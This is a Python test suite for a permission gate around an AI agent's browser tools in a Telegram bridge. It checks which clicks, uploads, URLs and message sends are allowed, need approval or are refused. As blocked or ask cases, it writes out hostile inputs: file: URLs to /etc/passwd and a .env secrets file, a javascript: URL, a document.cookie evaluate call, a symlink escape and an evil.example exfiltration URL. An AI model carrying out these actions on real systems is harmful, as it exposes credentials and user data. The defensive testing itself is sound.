#!/usr/bin/env python3
"""The browser gate: what runs, what asks, what is refused. Offline, no Kernel account.

    python3 -m tests.tg_bridge.browser_gate

  1. **Allowed without a tap:** navigate (http/https), snapshot, screenshot, type, fill_form,
     a click on a harmless named ref, upload of a vault file.
  2. **Asks (Allow once):** a click whose real label (from the refs file), description or
     selector says submit / pay / book / confirm / send / delete ... (German too); a click on a
     ref the last snapshot does not name; Enter or Space; type with submit; accepting a dialog;
     an upload from outside the vault or from a hidden folder; an unknown browser tool.
  3. **Refused:** browser_evaluate and browser_run_code_unsafe; file: and javascript: URLs; and
     once the conversation used the browser, gws send, `tools.chat send`, `beeper send`, WAHA.
  4. **Off by default.** Without TG_BROWSER no browser server, rule or channel text reaches the
     CLI; with it, all three do, every pinned tool has an ask rule, and the code tools are in
     disallowed_tools.
  5. **Through the pool:** can_use_tool allows, asks the approver, or blocks as decided, reads
     the real label from the refs file, and the "used" mark survives a fresh pool (restart).
  6. **Containment (Nov 8):** only the `browser` sub-agent has the browser (a browser call with
     no agent_id is refused; the server rides on the agent definition, not the main options), and
     each profile has allowed sites: off them, opening or acting asks once, and an Allow adds the
     site so the next visit is tapless.
"""
import asyncio
import json
import pathlib
import sys
import tempfile

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2]))

from tests.tg_bridge._fakes import Checks, FakeAgent, FAST_LIMITS
from jobs.tg_bridge import browser_gate as G
from jobs.tg_bridge.agent import AgentPool
from jobs.tg_bridge.sessions import SessionStore
from tools.browser import sites as SITES
from tools.browser import state as S

P = G.PREFIX
REFS = {"e5": ["textbox", "Email"], "e8": ["link", "Next page"],
        "e9": ["button", "Submit request"], "e10": ["button", ""],
        "e11": ["button", "Continue"], "e12": ["button", "Jetzt buchen"]}


def kind(name, inp=None, *, active=False, refs=REFS, roots=None):
    d = G.decide(name, inp or {}, active=active, refs=refs, upload_roots=roots)
    return d.kind if d else None


def decisions(check, tmp):
    vault = tmp / "vault"
    (vault / "Attachments").mkdir(parents=True)
    (vault / ".obsidian").mkdir()
    ok_file = vault / "Attachments" / "id.pdf"
    ok_file.write_text("x")
    hidden = vault / ".obsidian" / "x.json"
    hidden.write_text("x")
    outside = tmp / "secret.env"
    outside.write_text("x")
    link = vault / "Attachments" / "sneaky.pdf"
    link.symlink_to(outside)
    roots = [vault]

    # 1. allowed
    check("navigate https", kind(P + "browser_navigate", {"url": "https://speechify.com"}) == "allow")
    for t in ("browser_snapshot", "browser_take_screenshot", "browser_wait_for", "browser_find",
              "browser_close", "browser_navigate_back", "browser_select_option", "browser_hover"):
        check(f"{t} allowed", kind(P + t) == "allow")
    check("type without submit", kind(P + "browser_type", {"target": "e5", "text": "a@b.c"}) == "allow")
    check("fill_form", kind(P + "browser_fill_form", {"fields": [{"target": "e5", "name": "Email",
                                                                  "type": "textbox", "value": "x"}]}) == "allow")
    check("click on a harmless link", kind(P + "browser_click", {"element": "Next page", "target": "e8"}) == "allow")
    check("click on Continue", kind(P + "browser_click", {"element": "Continue", "target": "e11"}) == "allow")
    check("Tab key", kind(P + "browser_press_key", {"key": "Tab"}) == "allow")
    check("dismissing a dialog", kind(P + "browser_handle_dialog", {"accept": False}) == "allow")
    check("upload of a vault file", kind(P + "browser_file_upload", {"paths": [str(ok_file)]}, roots=roots) == "allow")
    check("new tab on a web URL", kind(P + "browser_tabs", {"action": "new", "url": "https://x.com"}) == "allow")

    # 2. asks
    check("click on Submit (real label)", kind(P + "browser_click", {"element": "the blue button", "target": "e9"}) == "ask")
    check("a page cannot relabel: description lies, label says Submit",
          kind(P + "browser_click", {"element": "Next page link", "target": "e9"}) == "ask")
    check("description says pay, ref harmless", kind(P + "browser_click", {"element": "Pay now", "target": "e8"}) == "ask")
    for word in ("Book a table", "Confirm", "Place order", "Send message", "Purchase", "Checkout",
                 "Check out", "Reserve", "RSVP", "Delete account", "Schedule pickup", "Buy now"):
        check(f"click '{word}' asks", kind(P + "browser_click", {"element": word, "target": "e8"}) == "ask")
    check("German: Jetzt buchen (real label)", kind(P + "browser_click", {"element": "button", "target": "e12"}) == "ask")
    check("German: Zahlungspflichtig bestellen", kind(P + "browser_click", {"element": "Zahlungspflichtig bestellen", "target": "e8"}) == "ask")
    check("Facebook link does not trip 'book'", kind(P + "browser_click", {"element": "Facebook", "target": "e8"}) == "allow")
    check("selector target asks (unverifiable)", kind(P + "browser_click", {"element": "Next", "target": "#btn-1"}) == "ask")
    check("selector naming submit asks", kind(P + "browser_click", {"element": "x", "target": "button[type=submit]"}) == "ask")
    check("unknown ref asks", kind(P + "browser_click", {"element": "Next", "target": "e99"}) == "ask")
    check("no refs yet asks", kind(P + "browser_click", {"element": "Next", "target": "e8"}, refs={}) == "ask")
    check("unnamed button asks", kind(P + "browser_click", {"element": "icon", "target": "e10"}) == "ask")
    for key in ("Enter", "NumpadEnter", " ", "Space"):
        check(f"press {key!r} asks", kind(P + "browser_press_key", {"key": key}) == "ask")
    check("type with submit asks", kind(P + "browser_type", {"target": "e5", "text": "x", "submit": True}) == "ask")
    check("accepting a dialog asks", kind(P + "browser_handle_dialog", {"accept": True}) == "ask")
    check("upload from outside the vault asks", kind(P + "browser_file_upload", {"paths": [str(outside)]}, roots=roots) == "ask")
    check("upload from a hidden vault folder asks", kind(P + "browser_file_upload", {"paths": [str(hidden)]}, roots=roots) == "ask")
    check("upload through a symlink out of the vault asks", kind(P + "browser_file_upload", {"paths": [str(link)]}, roots=roots) == "ask")
    check("one bad path in a batch asks", kind(P + "browser_file_upload", {"paths": [str(ok_file), str(outside)]}, roots=roots) == "ask")
    check("unknown browser tool asks", kind(P + "browser_mouse_click_xy", {"x": 1, "y": 2}) == "ask")

    # 3. refused
    check("evaluate blocked", kind(P + "browser_evaluate", {"function": "() => 1"}) == "block")
    check("run_code_unsafe blocked", kind(P + "browser_run_code_unsafe", {"code": "x"}) == "block")
    check("file: URL blocked", kind(P + "browser_navigate", {"url": "file:///home/<user>/.automation.env"}) == "block")
    check("javascript: URL blocked", kind(P + "browser_navigate", {"url": "javascript:alert(1)"}) == "block")
    check("new tab on file: blocked", kind(P + "browser_tabs", {"action": "new", "url": "file:///etc/passwd"}) == "block")
    sends = [("mcp__gws__send_gmail_message", {"to": "x"}),
             ("Bash", {"command": "echo hi | python3 -m tools.chat send 123"}),
             ("Bash", {"command": "beeper send abc hi"}),
             ("Bash", {"command": "curl -X POST http://127.0.0.1:3000/api/sendText -d '{}'"})]
    for name, inp in sends:
        check(f"{name} {inp.get('command', '')[:30]} blocked while browsing",
              kind(name, inp, active=True) == "block")
        check(f"...and left to the normal path when not browsing", kind(name, inp, active=False) is None)
    check("drafting is not a send", kind("mcp__gws__draft_gmail_message", {}, active=True) is None)
    check("reading mail is untouched", kind("mcp__gws__search_gmail_messages", {}, active=True) is None)
    check("ordinary Bash is untouched", kind("Bash", {"command": "ls"}, active=True) is None)

    # 6. containment
    def k6(name, inp=None, **kw):
        d = G.decide(name, inp or {}, active=True, refs=REFS, **kw)
        return d
    d = k6(P + "browser_snapshot", agent=False)
    check("a browser call from the main conversation is refused", d.kind == "block" and G.AGENT in d.reason)
    check("the same call from the sub-agent runs", k6(P + "browser_snapshot", agent=True).kind == "allow")
    check("other sub-agents keep the normal path for other tools",
          k6("Bash", {"command": "ls"}, agent=True) is None)
    H = ["speechify.com"]
    check("allowed site opens", k6(P + "browser_navigate", {"url": "https://speechify.com/x"}, agent=True, hosts=H).kind == "allow")
    check("its subdomain too", k6(P + "browser_navigate", {"url": "https://app.speechify.com/library"}, agent=True, hosts=H).kind == "allow")
    d = k6(P + "browser_navigate", {"url": "https://evil.example/?d=secret"}, agent=True, hosts=H)
    check("a site off the list asks, naming the host", d.kind == "ask" and d.new_host == "evil.example", d)
    check("a lookalike does not pass", k6(P + "browser_navigate", {"url": "https://speechify.com.evil.io/"}, agent=True, hosts=H).kind == "ask")
    check("www. is the same site", SITES.host_of("https://www.Speechify.com/a") == "speechify.com")
    check("a new tab off the list asks", k6(P + "browser_tabs", {"action": "new", "url": "https://evil.example"}, agent=True, hosts=H).kind == "ask")
    check("a throwaway browser with no sites asks for any site",
          k6(P + "browser_navigate", {"url": "https://speechify.com"}, agent=True, hosts=[]).kind == "ask")
    off = "https://evil.example/landing"
    d = k6(P + "browser_type", {"target": "e5", "text": "x"}, agent=True, hosts=H, page_url=off)
    check("typing on a page that wandered off asks", d.kind == "ask" and d.new_host == "evil.example")
    check("a harmless click there asks too", k6(P + "browser_click", {"element": "Next page", "target": "e8"}, agent=True, hosts=H, page_url=off).kind == "ask")
    check("an upload there asks", k6(P + "browser_file_upload", {"paths": [str(ok_file)]}, agent=True, hosts=H, page_url=off, upload_roots=roots).kind == "ask")
    check("reading it runs", k6(P + "browser_snapshot", agent=True, hosts=H, page_url=off).kind == "allow")
    check("dismissing its dialog runs", k6(P + "browser_handle_dialog", {"accept": False}, agent=True, hosts=H, page_url=off).kind == "allow")
    check("typing on an allowed page runs", k6(P + "browser_type", {"target": "e5", "text": "x"}, agent=True, hosts=H, page_url="https://app.speechify.com/").kind == "allow")
    check("Submit on an allowed page still asks", k6(P + "browser_click", {"element": "x", "target": "e9"}, agent=True, hosts=H, page_url="https://app.speechify.com/").kind == "ask")

    root = tmp / "sites"
    check("speechify starts with speechify.com", SITES.allowed("speechify", root=root) == ["speechify.com"])
    SITES.remember("cvs", "www.cvs.com", root=root)
    SITES.remember("cvs", "https://www.cvs.com/x", root=root)
    check("an Allow is remembered once, per profile", SITES.allowed("cvs", root=root) == ["cvs.com"])
    check("and stays with that profile", "cvs.com" not in SITES.allowed("speechify", root=root))


def config(check):
    check("off by default", G.enabled(lambda k, d="": d) is False)
    check("TG_BROWSER=1 turns it on", G.enabled(lambda k, d="": "1" if k == "TG_BROWSER" else d) is True)
    rules = G.ask_rules()
    check("every pinned tool has an ask rule", all(P + t in rules for t in G.TOOLS))
    check("code tools are disallowed at the CLI too",
          set(G.disallowed()) == {P + "browser_evaluate", P + "browser_run_code_unsafe"})
    ad = G.agent_definition("abc-123")
    check("the browser agent has the browser tools", P + "browser_click" in ad.tools and P + "browser_navigate" in ad.tools)
    check("...and nothing else", all(t.startswith(P) for t in ad.tools))
    check("...without the code tools", P + "browser_evaluate" not in ad.tools and P + "browser_run_code_unsafe" not in ad.tools)
    check("the browser server rides on the agent, keyed to the conversation",
          ad.mcpServers == [G.mcp_servers("abc-123")])
    check("the agent is told pages are untrusted", "untrusted" in ad.prompt)
    srv = G.mcp_servers("abc-123")["browser"]
    check("server runs vt browser mcp", srv["command"].endswith("/bin/vt") and srv["args"] == ["browser", "mcp"])
    check("with this conversation's key", srv["env"] == {"BROWSER_SESSION": "abc-123"})
    live = _live_tools()
    if live is None:
        check("pinned tool list (live check skipped: Playwright MCP not installed)", True)
    else:
        check("pinned tool list matches the installed Playwright MCP", sorted(live) == sorted(G.TOOLS),
              f"added {sorted(set(live) - set(G.TOOLS))}, gone {sorted(set(G.TOOLS) - set(live))}")


def _live_tools():
    import subprocess
    from tools.browser.proxy import PLAYWRIGHT_MCP
    if not PLAYWRIGHT_MCP.exists():
        return None
    msgs = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
        "protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}]
    p = subprocess.Popen(["node", str(PLAYWRIGHT_MCP), "--headless"], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    for m in msgs:
        p.stdin.write(json.dumps(m) + "\n")
    p.stdin.flush()
    try:
        for line in p.stdout:
            msg = json.loads(line)
            if msg.get("id") == 2:
                return [t["name"] for t in msg["result"]["tools"]]
    finally:
        p.kill()
    return None


async def pool(check, tmp):
    S.ROOT = tmp / "state"
    vault = tmp / "v"
    (vault / "_system" / "telegram-bridge").mkdir(parents=True)
    asked, readable, current = [], [], []

    async def approver(chat, thread, name, inp):
        asked.append(name)
        if current:
            readable.append(current[0].browser_approval(thread, name))
        return True, ""

    def make(browser):
        fake = FakeAgent()
        store = SessionStore(tmp / f"s{browser}{len(asked)}.sqlite")
        p = AgentPool(store, fake, cwd=vault, cli_path="/usr/bin/false",
                      style_path=vault / "_system" / "telegram-bridge" / "reply-style.md",
                      approver=approver, projects_dir=tmp / "projects", env={},
                      limits=FAST_LIMITS, browser=browser)
        return p, fake, store

    p, fake, store = make(False)
    sess = store.current(1, 0)
    await p.run_turn(sess, "hi", chat_id=1, thread_id=0)
    spec = fake.specs[-1]
    check("flag off: no MCP server passed", not spec.mcp_servers)
    check("flag off: no browser agent passed", not spec.agents)
    check("flag off: no browser ask rules", "mcp__browser" not in (spec.settings or ""))
    check("flag off: no browser channel text", "vt browser use" not in spec.append)
    await p.close_all()

    p, fake, store = make(True)
    sess = store.current(1, 0)
    await p.run_turn(sess, "hi", chat_id=1, thread_id=0)
    spec = fake.specs[-1]
    key = spec.claude_id
    check("flag on: the browser agent is passed", G.AGENT in (spec.agents or {}))
    check("flag on: the main conversation gets no browser server", "browser" not in (spec.mcp_servers or {}))
    check("flag on: BROWSER_SESSION is the Claude session id", spec.env.get("BROWSER_SESSION") == key)
    check("flag on: ask rules include the browser tools", P + "browser_click" in json.loads(spec.settings)["permissions"]["ask"])
    check("flag on: the gws send ask rule is still there", "mcp__gws__send_gmail_message" in spec.settings)
    check("flag on: channel text mentions vt browser use", "vt browser use" in spec.append)
    check("flag on: evaluate disallowed", P + "browser_evaluate" in spec.disallowed)

    cut = spec.can_use_tool
    ok, why = await cut("mcp__gws__send_gmail_message", {"to": "x"})
    check("before browsing, a send still goes to the approver", ok and asked[-1] == "mcp__gws__send_gmail_message")
    ok, why = await cut(P + "browser_snapshot", {})
    check("pool: a browser call without an agent id is refused", not ok and G.AGENT in why)
    S.save(key, {"profile": "testprof", "session_id": "x"})
    n = len(asked)
    ok, _ = await cut(P + "browser_navigate", {"url": "https://newsite.example/a"}, agent_id="a1")
    check("pool: a new site asks the approver", ok and len(asked) == n + 1)
    ok, _ = await cut(P + "browser_navigate", {"url": "https://newsite.example/b"}, agent_id="a1")
    check("pool: after the Allow, the same site is tapless", ok and len(asked) == n + 1)
    check("pool: remembered for the profile", "newsite.example" in SITES.allowed("testprof"))
    SITES.remember("testprof", "example.com")
    n = len(asked)
    ok, _ = await cut(P + "browser_navigate", {"url": "https://example.com"}, agent_id="a1")
    check("navigate runs without a tap", ok and len(asked) == n)
    S.save_refs(key, {"e9": ["button", "Submit request"], "e8": ["link", "Next page"]})
    ok, _ = await cut(P + "browser_click", {"element": "Next page", "target": "e8"}, agent_id="a1")
    check("harmless click runs without a tap", ok and len(asked) == n)
    S.save_refs(key, {"e9": ["button", "Submit request"], "e8": ["link", "Next page"]},
                url="https://example.com/book?zip=94301")
    current.append(p)
    ok, _ = await cut(P + "browser_type", {"element": "First name", "target": "e3", "text": "the owner"}, agent_id="a1")
    check("typing runs without a tap", ok and len(asked) == n)
    await cut(P + "browser_type", {"element": "Card number", "target": "e4", "text": "4111 1111 1111 1111"}, agent_id="a1")
    ok, _ = await cut(P + "browser_click", {"element": "Next page", "target": "e9"}, agent_id="a1")
    check("click on the real Submit asks the approver", ok and asked[-1] == P + "browser_click" and len(asked) == n + 1)
    shown, why, speak = readable[-1] or ("", "", "")
    check("the approval names the page, not the query", "On example.com/book" in shown and "94301" not in shown, shown)
    check("the approval shows what was typed", '- First name: "the owner"' in shown, shown)
    check("a card number is hidden", "Card number: (hidden)" in shown and "4111" not in shown + speak, shown)
    check("the reason is plain words", "submits, sends, pays" in why, why)
    check("the spoken version names the fields", "after entering First name, Card number" in speak, speak)
    check("the ask is gone after the answer", p.browser_approval(0, P + "browser_click") is None)
    current.clear()
    ok, why = await cut(P + "browser_evaluate", {"function": "() => document.cookie"}, agent_id="a1")
    check("evaluate is refused with a reason", not ok and "Blocked" in why)
    ok, why = await cut("mcp__gws__send_gmail_message", {"to": "x"})
    check("after browsing, gws send is refused without asking", not ok and "/new" in why and len(asked) == n + 1)
    await p.close_all()

    p2, fake2, store2 = make(True)
    verdict = p2._browser_decide(key, "Bash", {"command": "beeper send x hi"})
    check("the used mark survives a restart of the bridge", verdict is not None and verdict.kind == "block")
    other = p2._browser_decide("another-session", "Bash", {"command": "beeper send x hi"})
    check("and binds only that conversation", other is None)
    await p2.close_all()


def run() -> list[str]:
    check = Checks("browser gate")
    with tempfile.TemporaryDirectory() as d:
        tmp = pathlib.Path(d)
        decisions(check, tmp)
        config(check)
        old = S.ROOT
        try:
            asyncio.run(pool(check, tmp))
        finally:
            S.ROOT = old
    return check.fails


if __name__ == "__main__":
    sys.exit(1 if run() else 0)
